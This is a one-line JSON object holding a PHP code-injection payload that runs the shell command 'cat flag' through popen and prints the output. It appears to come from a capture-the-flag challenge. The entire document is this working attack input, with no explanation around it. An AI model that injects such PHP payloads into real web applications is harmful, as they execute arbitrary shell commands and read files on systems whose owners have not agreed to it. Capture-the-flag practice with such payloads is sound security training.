{
    "a": "<?php print_r(fread(popen(\"cat flag\", \"r\"), $size));; ?>"
}